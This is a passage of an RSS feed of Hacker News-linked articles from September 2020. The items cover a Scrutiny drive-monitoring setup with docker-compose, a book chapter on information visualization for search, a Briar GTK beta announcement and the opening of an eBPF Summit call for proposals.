break will help you solve the problem more efficiently or to see it differently when you come back to it.</p><p>Also, be patient with other people. Things can take a while to learn and people are not perfect. Making mistakes and failing can be some of the most important experiences in the learning process, so allow for that instead of creating an environment where it isn't safe to take risks or grow. Understand that different things click more easily for different people, and know that learning can take a while.</p><h2>Creativity</h2><p>My favorite thing about being a programmer is that I get to use my creative energy to build things that other people can then benefit from. You get to think outside of the box to create really cool things.</p><p>Having creative ideas is important for coming up with ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://welearncode.com/most-important-nonprogramming/">https://welearncode.com/most-important-nonprogramming/</a></em></p>]]>
            </description>
            <link>https://welearncode.com/most-important-nonprogramming/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577876</guid>
            <pubDate>Thu, 24 Sep 2020 12:21:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Scrutiny to monitor your drives]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577806">thread link</a>) | @theorangeone
<br/>
September 24, 2020 | https://theorangeone.net/posts/scrutiny/ | <a href="https://web.archive.org/web/*/https://theorangeone.net/posts/scrutiny/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>After recently deploying a ZFS pool, I realized I had little insight into the health of my drives. I can run SMART stats now and then, but that‚Äôs not quite the same.</p><h2 id="scrutiny"><a href="#scrutiny">#</a> Scrutiny</h2><p><a href="https://github.com/AnalogJ/scrutiny">Scrutiny</a> is a tool to help you with just that. It presents a web UI which shows you statistics on your drives, based on SMART reports, and reports their health.</p><p>When <a href="https://www.reddit.com/r/selfhosted/comments/icreui/scrutiny_hard_drive_smart_monitoring_historical/">originally announced</a>, you could only get access if you <a href="https://github.com/sponsors/AnalogJ/">supported the author</a>, however now enough people have supported, the project is completely free and open source. Can‚Äôt say I‚Äôm personally a huge fan of this model, but people who make great software should be rewarded, and I think Scrutiny is <strong>great</strong> software!</p><h2 id="deploying"><a href="#deploying">#</a> Deploying</h2><p>Scrutiny is written in Go meaning, if you so wish, you can deploy it by downloading a single binary, and running that. I however, prefer deploying things as docker containers. Fortunately, there‚Äôs both an <a href="https://hub.docker.com/r/analogj/scrutiny">official one</a>, and <a href="https://hub.docker.com/r/linuxserver/scrutiny">one provided by the LinuxServer.io folks</a>.</p><p>Scrutiny is split into 2 components: the web UI and the collector. Currently, the collector requires that the container be run <code>--privileged</code>, so it can run SMART reports correctly. This can pose security issues, as it defeats many of the isolations Docker puts in place for you. Instead, both containers support running just 1 of the entry points, meaning the collector can be run privileged, but not the web UI, massively decreasing the attack surface.</p><div><pre><code data-lang="yaml"><span>version</span><span>:</span><span> </span><span>"2.3"</span><span>
</span><span>
</span><span></span><span>services</span><span>:</span><span>
</span><span>  </span><span>web</span><span>:</span><span>
</span><span>    </span><span>image</span><span>:</span><span> </span>linuxserver/scrutiny<span>:</span>latest<span>
</span><span>    </span><span>ports</span><span>:</span><span>
</span><span>      </span>- <span>"7278:8080"</span><span>
</span><span>    </span><span>volumes</span><span>:</span><span>
</span><span>      </span>- ./config<span>:</span>/config<span>
</span><span>    </span><span>environment</span><span>:</span><span>
</span><span>      </span>- SCRUTINY_WEB=<span>true</span><span>
</span><span>      </span>- PUID=<span>3000</span><span>
</span><span>      </span>- PGID=<span>3000</span><span>
</span><span>    </span><span>restart</span><span>:</span><span> </span>unless-stopped<span>
</span><span>
</span><span>  </span><span>collector</span><span>:</span><span>
</span><span>    </span><span>image</span><span>:</span><span> </span>linuxserver/scrutiny<span>:</span>latest<span>
</span><span>    </span><span>privileged</span><span>:</span><span> </span><span>true</span><span>
</span><span>    </span><span>volumes</span><span>:</span><span>
</span><span>      </span>- /dev/disk<span>:</span>/dev/disk<span>
</span><span>      </span>- /run/udev<span>:</span>/run/udev<span>:</span>ro<span>
</span><span>      </span>- ./config<span>:</span>/config<span>
</span><span>    </span><span>environment</span><span>:</span><span>
</span><span>      </span>- SCRUTINY_COLLECTOR=<span>true</span><span>
</span><span>      </span>- SCRUTINY_API_ENDPOINT=http<span>:</span>//web<span>:</span><span>8080</span><span>
</span><span>      </span>- PUID=<span>3000</span><span>
</span><span>      </span>- PGID=<span>3000</span><span>
</span><span>    </span><span>restart</span><span>:</span><span> </span>unless-stopped<span>
</span></code></pre></div><h2 id="usage"><a href="#usage">#</a> Usage</h2><p>When you first load up the Scrutiny UI, you‚Äôll be met with a message that there‚Äôs no data. This is normal. Because Scrutiny only collects data each day at midnight, you‚Äôll need to run the initial import yourself:</p><div><pre><code data-lang="fallback">docker-compose exec collector scrutiny-collector-metrics run
</code></pre></div><p>This will collect metrics for your drives, and report them back to the Scrutiny web process for storage. Once that‚Äôs complete, reload the web UI and you‚Äôll be met with some statistics about your drives.</p><figure><a href="https://theorangeone.net/posts/scrutiny/scrutiny-drive-list_hu43e0e4259e39e327d7144370023b5af3_89067_1500x0_resize_lanczos_2.png" target="_blank"><img src="https://theorangeone.net/posts/scrutiny/scrutiny-drive-list_hu43e0e4259e39e327d7144370023b5af3_89067_1500x0_resize_lanczos_2.png" alt="Scrutiny homepage, showing the drives connected to my server"></a><figcaption><small>Scrutiny homepage, showing the drives connected to my server</small></figcaption></figure><p>Here you can see all the drives connected to your server, along with a summary of the health of each drive.</p><p>Clicking on a drive shows you more statistics, and specific metrics from the SMART report.</p><figure><a href="https://theorangeone.net/posts/scrutiny/scrutiny-drive-details_hu55c38c76048b7706e61b18016b8e5133_96229_1500x0_resize_lanczos_2.png" target="_blank"><img src="https://theorangeone.net/posts/scrutiny/scrutiny-drive-details_hu55c38c76048b7706e61b18016b8e5133_96229_1500x0_resize_lanczos_2.png" alt="Details of a specific drive in Scrutiny"></a><figcaption><small>Details of a specific drive in Scrutiny</small></figcaption></figure><h2 id="future"><a href="#future">#</a> Future</h2><p>Scrutiny is a pretty young project, but the quality of the project, responsiveness of the author, and utility of it are incredible!</p><p>There are some features missing, most notably alerts (although I hear this is in the works). <a href="https://blog.ktz.me/"><code>@IronicBadger</code></a> also <a href="https://blog.ktz.me/scrutiny-a-smart-hard-drive-monitoring-tool/#feature-requests">made some requests</a> for future features, which it‚Äôd be great to see interested.</p><p>I‚Äôm definitely leaving this deployed on my machine, and can‚Äôt wait to see how this project develops.</p></div></div>]]>
            </description>
            <link>https://theorangeone.net/posts/scrutiny/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577806</guid>
            <pubDate>Thu, 24 Sep 2020 12:11:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Information Visualization for Search Interfaces (2009)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577758">thread link</a>) | @smusamashah
<br/>
September 24, 2020 | http://searchuserinterfaces.com/book/sui_ch10_visualization.html | <a href="https://web.archive.org/web/*/http://searchuserinterfaces.com/book/sui_ch10_visualization.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="chapter_10"><p>From the book <i>Search User Interfaces</i>, published by Cambridge University Press.  Copyright ¬© 2009 by Marti A. Hearst.</p>

<p>
The preceding chapters have discussed user interfaces to support search, with a focus on what is known to be successful (from a usability perspective) for the vast majority of searchers. This and the following chapter describe efforts to improve search interfaces by incorporating <i> visual</i> information into the display using techniques from the field of <i> information visualization</i>. </p><p>
The human perceptual system is highly attuned to images, and visual representations can communicate some kinds of information more rapidly and effectively than text. For example, the familiar bar chart or line graph can be much more evocative of the underlying data than the corresponding table of numbers (<a href="http://searchuserinterfaces.com/book/sui_references.html#larkin1987dsw" title="JH&nbsp;Larkin and
  HA&nbsp;Simon.
Why a diagram is (sometimes) worth 10,000 words.
<i>Cognitive Science</i>, 11(1):65‚Äì99, 1987.">Larkin and Simon, 1987a</a>). The goal of information visualization is to translate abstract information into a visual form that provides new insight about that information. Visualization has been shown to be successful at providing insight about data for a wide range of tasks. </p>


<p>
The field of information visualization is a vibrant one, with hundreds of innovative ideas burgeoning on the Web. However, applying visualization to textual information is quite challenging, especially when the goal is to improve search over text collections. As discussed in earlier chapters, search is a means towards some other end, rather than a goal in itself. When reading text, one is focused on that task; it is not possible to read and visually perceive something else at the same time. Furthermore, the nature of text makes it difficult to convert it to a visual analogue. </p><p>
Most likely for these reasons, applications of visualization to general search have not been widely accepted to date, and few usability results are positive. For example, <a href="http://searchuserinterfaces.com/book/sui_references.html#chen2000esi" title="C.&nbsp;Chen and Y.&nbsp;Yu.
Empirical studies of information visualization: a meta-analysis.
<i>International Journal of Human-Computers Studies</i>, 53(5):851‚Äì866,
  2000.">Chen and Yu, 2000</a> conducted a meta-analysis of information visualization usability studies, with a focus on information retrieval problems. The purpose of a meta-analysis is to combine many different points in the evaluation space in order to come up with more robust and general results. <a href="http://searchuserinterfaces.com/book/sui_references.html#chen2000esi" title="C.&nbsp;Chen and Y.&nbsp;Yu.
Empirical studies of information visualization: a meta-analysis.
<i>International Journal of Human-Computers Studies</i>, 53(5):851‚Äì866,
  2000.">Chen and Yu, 2000</a> focused on six visualization interface studies from five papers (<a href="http://searchuserinterfaces.com/book/sui_references.html#robertson1998dmu" title="G.&nbsp;Robertson, M.&nbsp;Czerwinski, K.&nbsp;Larson, D.C. Robbins,
  D.&nbsp;Thiel, and M.&nbsp;van Dantzich.
Data mountain: using spatial memory for document management.
<i>Proceedings of the 11th annual ACM symposium on User Interface Software
  and Technology (UIST'98)</i>, pages 153‚Äì162, 1998.">Robertson et&nbsp;al.,   1998</a>, <a href="http://searchuserinterfaces.com/book/sui_references.html#allen2000ida" title="B.&nbsp;Allen.
Individual differences and the conundrums of user-centered design: Two
  experiments.
<i>Journal of the American Society for Information Science</i>,
  51(6):508‚Äì520, 2000."> Allen, 2000</a>, <a href="http://searchuserinterfaces.com/book/sui_references.html#sebrechts1999vsr" title="M.M.
  Sebrechts, J.&nbsp;Vasilakis, M.S. Miller, J.V. Cugini, and S.J. Laskowski.
Visualization of Search Results: A Comparative Evaluation of Text, 2D and 3D
  Interfaces.
<i>Proceedings of the 22nd Annual International ACM SIGIR Conference on
  Research and development in information retrieval (SIGIR'99)</i>, pages
  3‚Äì10, 1999."> Sebrechts et&nbsp;al., 1999</a>, <a href="http://searchuserinterfaces.com/book/sui_references.html#swan1998awv" title="R.C. Swan and
  J.&nbsp;Allan.
Aspect Windows, 3-D Visualizations, and Indirect Comparisons of Information
  Retrieval Systems.
<i>Proceedings of the 21st Annual International ACM SIGIR Conference on
  Research and development in information retrieval (SIGIR'98)</i>, pages
  173‚Äì181, 1998."> Swan and Allan, 1998</a>, <a href="http://searchuserinterfaces.com/book/sui_references.html#combs1999dzi" title="T.T.A. Combs
  and B.B. Bederson.
Does zooming improve image browsing?
<i>Proceedings of the fourth ACM Conference on Digital Libraries</i>,
  pages 130‚Äì137, 1999."> Combs and Bederson, 1999</a>). The conclusions of the meta-analysis were: </p>
<ul>
<li> Individual cognitive differences among participants, as opposed to differences among the interfaces, had the largest effect, especially on accuracy, and to some degree on efficiency, </li><li> Holding cognitive abilities constant, participants performed better with simpler visual-spatial interfaces than with complex ones, and </li><li> The combined effect of visualization in the studies was not statistically significant. </li></ul>
<p>
Thus, this meta-analysis found no evidence that visualization improved search performance. This is not to say that advanced visual representations cannot help improve search; rather that there are few proven successful ideas today. </p>
<p>
On the other hand, for analytical tasks, visualization of textual information appears more promising. A visualization that is not appropriate for a general search audience might instead be quite valuable for someone with expertise and deep interest in understanding data. Thus it is useful to follow make a distinction between visualization of text for the purposes of text analysis versus visualization for search. </p>
<p>
This and the following chapter are intended to be read together. This chapter provides a brief a summary of the core principles and standard tools of information visualization, followed by a discussion of how different data types are best visualized. This chapter also describes why visualizing nominal data, which includes textual data, is difficult. It then describes how researchers have attempted to improve search using visualization techniques. Chapter <a href="http://searchuserinterfaces.com/book/sui_ch11_text_analysis_visualization.html"><b>11</b></a> discusses the vibrant area of visualization for text analysis tasks. </p><div id="section_10.1"><h2>10.1: Principles of Information Visualization</h2>
<p>
Guidelines for designing information visualizations are available from writers such as Few (<a href="http://searchuserinterfaces.com/book/sui_references.html#few2006idd" title="S.&nbsp;Few.
<i>Information Dashboard Design: The Effective Visual Communication of
  Data</i>.
O'Reilly, 2006.">Few, 2006</a>, <a href="http://searchuserinterfaces.com/book/sui_references.html#few2009nys" title="S.&nbsp;Few.
<i>Now You See It: Simple Visualization Techniques for Quantitative
Analysis</i>.
Analytics Press, 2009."> Few, 2009</a>) and Tufte (<a href="http://searchuserinterfaces.com/book/sui_references.html#tufte83" title="Edward Tufte.
<i>The Visual Display of Quantitative Information</i>.
Graphics Press, Chelshire, CT, 1983.">Tufte, 1983</a>, <a href="http://searchuserinterfaces.com/book/sui_references.html#tufte1990ei" title="E.R. Tufte.
<i>Envisioning information</i>.
Graphics Press Cheshire, Conn.(PO Box 430, Cheshire 06410), 1990."> Tufte, 1990b</a>). Some of these guidelines overlap with guidelines from graphic design, including the need to present information clearly, precisely, and without extraneous or distracting clutter. Other guidelines relate to the special purposes of visualization. Good visualizations use graphics to organize information, highlight important information, allow for visual comparisons, and reveal patterns, trends, and outliers in the data. Visualization guidelines are also derived from principles of human perception, and urge the designer to be aware of the perceptual properties which can affect the design. <a href="http://searchuserinterfaces.com/book/sui_references.html#few2006idd" title="S.&nbsp;Few.
<i>Information Dashboard Design: The Effective Visual Communication of
  Data</i>.
O'Reilly, 2006.">Few, 2006</a> provides a good overview of these principles, which are described briefly below. </p><div id="figure_10.1"><p><a rel="lightbox" title="Figure 10.1(a)" href="http://searchuserinterfaces.com/book/images/healy1.png"><img src="http://searchuserinterfaces.com/book/images/healy1.png" width="200px"></a></p><p>(a)<br></p><p><a rel="lightbox" title="Figure 10.1(b)" href="http://searchuserinterfaces.com/book/images/healy2.png"><img src="http://searchuserinterfaces.com/book/images/healy2.png" width="200px"></a></p><p>(b)<br></p><p><b>Figure 10.1:</b>  (a) Viewers can preattentively recognize differences in color. (b) Viewers cannot preattentively recognize simultaneously variation of color plus shape. from <a href="http://searchuserinterfaces.com/book/sui_references.html#healy93" title="C.&nbsp;Healy.
<i>Visualization of Multivariate Data Using Preattentive
  Processing</i>.
PhD thesis, University of British Columbia Masters Thesis, 1993.
http://www.csc.ncsu.edu/faculty/healey/download/masters.pdf.">Healy, 1993</a>. 
</p><!-- end div caption --></div> <!-- end div figure --><p>
One important perceptual property is that of <i> preattentiveness</i> (<a href="http://searchuserinterfaces.com/book/sui_references.html#triesman1985ppv" title="A.&nbsp;Triesman.
Preattentive processing in vision.
<i>Computer Vision, Graphics and Image Processing</i>, 31:156‚Äì177,
  1985.">Triesman, 1985</a>). This term refers to visual properties that a person can perceive in fewer than 250 milliseconds, without having to scan the visual field serially (since eye movement and focus take about 200ms) (<a href="http://searchuserinterfaces.com/book/sui_references.html#ware2004ivp" title="C.&nbsp;Ware.
<i>Information Visualization: Perception for Design</i>.
Morgan Kaufmann, 2004.">Ware, 2004</a>). Preattentive observations take the same amount of time regardless of the number of objects being viewed. For example, people can accurately determine whether or not one red circle is presented among a field of blue circles in fewer than 200ms (see Figure <a href="#figure_10.1"><b>10.1</b></a>a). However, determining the <i> number</i> of items with the alternative color is <i> not</i> preattentive; it requires a serial scan of all the objects to do the counting (<a href="http://searchuserinterfaces.com/book/sui_references.html#healy93" title="C.&nbsp;Healy.
<i>Visualization of Multivariate Data Using Preattentive
  Processing</i>.
PhD thesis, University of British Columbia Masters Thesis, 1993.
http://www.csc.ncsu.edu/faculty/healey/download/masters.pdf.">Healy, 1993</a>). <i> Combinations</i> of properties are also usually not preattentive. Although people can detect one square among many circles of the same color (because the angular corners of the square are preattentively differentiated from the curves of the circles), the eye cannot detect the combination of the color distinction and the shape distinction simultaneously; this requires serial scanning. Figure <a href="#figure_10.1"><b>10.1</b></a>b shows an example; viewers cannot preattentively detect that there is a red, circular-shaped object among a field of blue and red circles and squares. </p>


<p>
Preattentiveness explains why a small amount of color highlighting against a white page is so effective at drawing the attention. As discussed in earlier chapters, a notable successful use of visual cues in search interfaces is color highlighting of query terms in documents, and bolding of query terms in document summaries in retrieval results. (However, if there are many colors in a display, color highlighting does not work well at drawing attention.) Note that not all cues in a visualization need to be preattentive to be useful; rather, it is important to know which visual components cause a preattentive reaction in order to know what will stand out in a display. </p>
<p>
Another important set of perceptual principles pertains to the visual components that are useful for making quantitative comparisons (<a href="http://searchuserinterfaces.com/book/sui_references.html#mackinlay1986adg" title="J.&nbsp;Mackinlay.
Automating the Design of Graphical Presentations of Relational Information.
<i>ACM Transactions on Graphics</i>, 5(2), 1986.">Mackinlay, 1986</a>). <a href="http://searchuserinterfaces.com/book/sui_references.html#bertin83" title="J.&nbsp;Bertin.
<i>Semiology of graphics</i>.
University of Wisconsin Press, 1983.">Bertin, 1983</a> defines a <i> graphical vocabulary</i> consisting of <i> marks</i> (points, lines, areas), <i> retinal variables</i> (color, size, shape, orientation, scale), and <i> position</i> (relative locations of marks within a spatial field). <a href="http://searchuserinterfaces.com/book/sui_references.html#cleveland1985egd" title="W.S. Cleveland.
<i>The elements of graphing data</i>.
Wadsworth Publ. Co. Belmont, CA, USA, 1985.">Cleveland, 1985</a> and <a href="http://searchuserinterfaces.com/book/sui_references.html#cleveland1984gpt" title="W.S.
  Cleveland and R.&nbsp;McGill.
Graphical Perception: Theory, Experimentation, and Application to the
  Development of Graphical Methods.
<i>Journal of the American Statistical Association</i>, 79(387):531‚Äì554,
  1984.">Cleveland and McGill, 1984</a> discuss the proper ways to combine these variables. For example, relative length can be assessed precisely, and so the relative positions of the tops of a row of bars in a bar chart can be used to accurately compare quantitative values. The perceptual system naturally associates a larger value to a larger size mark. The shape of lines are also evocative; a line graph can be used to indicate changes over time and other trends, and line cross-overs and relative positions are perceptually salient (see Figure <a href="#figure_10.3"><b>10.3</b></a>). </p>


<p>
<i> Gestalt principles</i> are also important for visualization (<a href="http://searchuserinterfaces.com/book/sui_references.html#few2006idd" title="S.&nbsp;Few.
<i>Information Dashboard Design: The Effective Visual Communication of
  Data</i>.
O'Reilly, 2006.">Few, 2006</a>). Among the most important of these is the principle of <i> proximity</i>, meaning that objects that are located spatially near one another are perceived as belonging to the same group. This principle is used extensively in interface design; for example, text labels are perceived to label those lines or entry forms that are nearest. Blank areas surrounding proximally close objects help contribute to the perception of grouping. Another gestalt principle, that of <i> similarity</i>, reflects the tendency to see objects that share the same visual attributes as being part of the same group. </p>

<div id="figure_10.2"><p><a rel="lightbox" title="Figure 10.2" href="http://searchuserinterfaces.com/book/images/auto-mpg-table.png"><img src="http://searchuserinterfaces.com/book/images/auto-mpg-table.png" width="400px"></a></p><p><b>Figure 10.2:</b>  A table of statistics about several brands of automobiles from the U.S., Europe, and Japan, from 1970-1979. 
</p><!-- end div caption --></div> <!-- end div figure --></div> <!-- end div section -->
<div id="section_10.2"><h2>10.2: Techniques for Interactive Visualization</h2>
<p>
Several interactive techniques are important to information visualization. In the technique known as <i> brushing and linking</i>, highlighting objects in one part of a visualization causes those same objects to be highlighted in a different view. For example, selecting points at the uppermost corner of a scatter plot would show the positions of those same points in a bar graph plotting other attributes of the same dataset. User interaction of this nature can improve comprehension and can help find interesting associations within the data. The brushing-and-linking technique is heavily used in text analysis interfaces. </p>

<p>
For large or densely packed visualizations, movie camera-style interaction techniques include providing an <i> overview</i> of the data, <i> zooming</i> in to see details or zooming out to see the bigger picture, and <i> panning</i> laterally across a view of the data. These kinds of interaction are used heavily in online map applications. Zooming has been found in several studies to be less optimal than showing multiple views of the same information when complex visual comparisons must be made (<a href="http://searchuserinterfaces.com/book/sui_references.html#plumlee2006zvm" title="M.&nbsp;Plumlee
  and C.&nbsp;Ware.
Zooming versus multiple window interfaces: Cognitive costs of visual
  comparisons.
<i>ACM Transactions on Computer-Human Interaction (TOCHI)</i>,
  13(2):179‚Äì209, 2006.">Plumlee and Ware, 2006</a>). </p>

<p>
The judicious use of <i> animation</i> is important in interactive visualization, to draw attention, retain ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://searchuserinterfaces.com/book/sui_ch10_visualization.html">http://searchuserinterfaces.com/book/sui_ch10_visualization.html</a></em></p>]]>
            </description>
            <link>http://searchuserinterfaces.com/book/sui_ch10_visualization.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577758</guid>
            <pubDate>Thu, 24 Sep 2020 12:04:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[First Beta Release of Briar GTK]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577727">thread link</a>) | @Funes-
<br/>
September 24, 2020 | https://nico.dorfbrunnen.eu/posts/2020/briar-beta/ | <a href="https://web.archive.org/web/*/https://nico.dorfbrunnen.eu/posts/2020/briar-beta/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
  <section>
    <article>
      <header>
        
        <div>
          <p><span>
              <i></i>
              <time datetime="2020-09-10T00:00:00Z">
                September 10, 2020
              </time>
            </span>
            <span>
              <i></i>
              2 minutes read
            </span>
          </p>
          

          

        </div>
      </header>

      <div>
        <p>Almost half a year after releasing <a href="https://nico.dorfbrunnen.eu/posts/2020/briar-alpha/">the first alpha release of Briar GTK</a>, today marks the day of its first beta release. Much has happened in the meantime and many people, including me, were able to test Briar GTK and use it in regular occasions. Let‚Äôs have a look at how this first beta release looks like:</p>
<p><a href="https://nico.dorfbrunnen.eu/images/posts/2020/briar-beta/briar-gtk-screenshot-1.png"><img src="https://nico.dorfbrunnen.eu/images/posts/2020/briar-beta/briar-gtk-screenshot-1.png" alt="Briar GTK in conversation view with two contacts on the left in list and an option to delete the contact"></a></p>
<p>For those not knowing, <a href="https://briar.app/">Briar</a> is a messaging system that keeps information flowing all the time. Whether your internet connection has been cut due to natural disasters or because of governmental censorship, Briar will try its best to get your messages out there to your peers.</p>
<p>As you might already anticipate from the screenshot, it‚Äôs now much clearer which messages belong to which author. Additionally, on the left side you can see that Alice is online while Bob is offline. Support for this has landed in earlier alpha releases already. Another huge improvements to Briar‚Äôs UX is that you‚Äôre now able to copy content from messages. Beside being fully translated to German and Spanish and allowing to delete contacts, this beta release of Briar GTK also offers basic notification support. However, it depends on your desktop environment whether this will work for you.</p>
<p>Note that Briar GTK currently only supports private chats. Support for private groups and forums isn‚Äôt yet available in the <a href="https://code.briarproject.org/briar/briar/-/tree/master/briar-headless">Briar Headless API</a> and therefore those features can‚Äôt be used in Briar GTK.</p>
<p>Updating to the new version is as easy as calling <code>flatpak update</code> or installing the new .deb files. If you‚Äôre new to Briar GTK, you might want to look at its <a href="https://code.briarproject.org/briar/briar-gtk/-/blob/main/README.md#installation">installation instructions</a> to learn how to install it.</p>
<p>If you want to stay informed about what happens to the outer Briar universe, make sure to <a href="https://nico.dorfbrunnen.eu/tags/briar/index.xml">subscribe to this rss feed</a> which will keep you up-to-date on everything happening around Briar on this blog.</p>
<p><a href="https://nico.dorfbrunnen.eu/images/posts/2020/briar-beta/briar-gtk-screenshot-4.png"><img src="https://nico.dorfbrunnen.eu/images/posts/2020/briar-beta/briar-gtk-screenshot-4.png" alt="Briar GTK in conversation view with two contacts on the left in list and an option to delete the contact"></a></p>
<p><em>All content in this blog post got released under a <a href="https://creativecommons.org/publicdomain/zero/1.0/">CC0 1.0 Universal Public Domain Dedication</a>. Feel free to share it with your peers!</em></p>

      </div>

      
    </article>

    
  </section>

      </div></div>]]>
            </description>
            <link>https://nico.dorfbrunnen.eu/posts/2020/briar-beta/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577727</guid>
            <pubDate>Thu, 24 Sep 2020 12:00:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Introduction to SCION]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577659">thread link</a>) | @matzf
<br/>
September 24, 2020 | https://www.sidnlabs.nl/en/news-and-blogs/new-internet-infrastructures-an-introduction-to-scion | <a href="https://web.archive.org/web/*/https://www.sidnlabs.nl/en/news-and-blogs/new-internet-infrastructures-an-introduction-to-scion">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.sidnlabs.nl/en/news-and-blogs/new-internet-infrastructures-an-introduction-to-scion</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577659</guid>
            <pubDate>Thu, 24 Sep 2020 11:49:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[EBPF Summit 2020 ‚Äì CFP is now open]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24577647">thread link</a>) | @tgraf
<br/>
September 24, 2020 | https://ebpf.io/ebpf-summit-2020-cfp/ | <a href="https://web.archive.org/web/*/https://ebpf.io/ebpf-summit-2020-cfp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" id="gatsby-focus-wrapper"><div><div><div><div><div><p><span>October  28-29th, 2020</span><span>|</span><span>A Free Virtual Event</span></p><p>Call For Proposals</p><p>We‚Äôre excited to announce that the call for proposals is now open for the inaugural eBPF Summit, a virtual event, targeted at DevOps, platform architects and developers.</p><p>The summit is offered at no cost, and will include keynotes from those leading the open source eBPF community including eBPF power-users as well as user lightning talks. Participants will have a chance to ask questions to the speakers and chat with peers on a Slack forum. We‚Äôre inviting eBPF users, contributors and community members to participate in this virtual gathering.</p></div></div><div><h2>About the eBPF Summit</h2><p>eBPF is quickly becoming one of the most talked about technologies in our industry - enabling a new generation of networking, tracing, observability and security infrastructure. The eBPF Summit is targeted at users and potential users of this groundbreaking technology - both those looking at leveraging eBPF directly or via one of the projects leveraging eBPF (e.g. bpftrace, Cilium, Falco etc.).</p></div><div><h2>Confirmed Keynote Speakers</h2><div><div><p><img src="https://ebpf.io/static/alexey-starovoitov-8f8f40922a4ab69a1153f7920aa30952.png" alt="Alexei Starovoitov"></p><h3>Alexei Starovoitov</h3><div><p>Co-maintainer eBPF,</p><p>Facebook</p></div></div><div><p><img src="https://ebpf.io/static/brendan-gregg-95ac4a84726a2854fc08eeccf4efb3cc.png" alt="Brendan Gregg"></p><h3>Brendan Gregg</h3><div><p>Author of ‚ÄúBPF Performance Tools‚Äú,</p><p>Lead Performance Engineer,</p><p>Netflix</p></div></div><div><p><img src="https://ebpf.io/static/daniel-borkmann-ad8ea1cea4487752aee473cdfeab64db.png" alt="Daniel Borkmann"></p><h3>Daniel Borkmann</h3><div><p>Co-maintainer eBPF,</p><p>Isovalent</p></div></div><div><p><img src="https://ebpf.io/static/david-miller-472d128f44319f988ddbdba9bd0b2898.png" alt="David Miller"></p><h3>David Miller</h3><div><p>Linux Kernel Networking Maintainer,</p><p>Red Hat</p></div></div><div><p><img src="https://ebpf.io/static/kris-nova-64d0ee6f9b5fcc0b94bec82140b99699.png" alt="Kris Nova"></p><h3>Kris Nova</h3><div><p>Chief Open Source Advocate,</p><p>Sysdig</p></div></div><div><p><img src="https://ebpf.io/static/kp-singh-1d454c6f8fee13c6fd90163f291b50b1.png" alt="KP Singh"></p><h3>KP Singh</h3><div><p>Kernel Runtime Security,</p><p>Google</p></div></div><div><p><img src="https://ebpf.io/static/laurent-bernaille-696ad3565b2ed182fd170a366c058d08.png" alt="Laurent Bernaille"></p><h3>Laurent Bernaille</h3></div><div><p><img src="https://ebpf.io/static/liz-rice-6b8760303d3ddf1923cb7d34f3d0bb2d.png" alt="Liz Rice"></p><h3>Liz Rice</h3><div><p>VP, Open Source Engineering,</p><p>Aqua</p></div></div><div><p><img src="https://ebpf.io/static/tomas-graf-607005c54b9411446b9574ae0f7fb082.png" alt="Tomas Graf"></p><h3>Tomas Graf</h3><div><p>Co-founder of the Cilium Project,</p><p>Isovalent</p></div></div><div><p><img 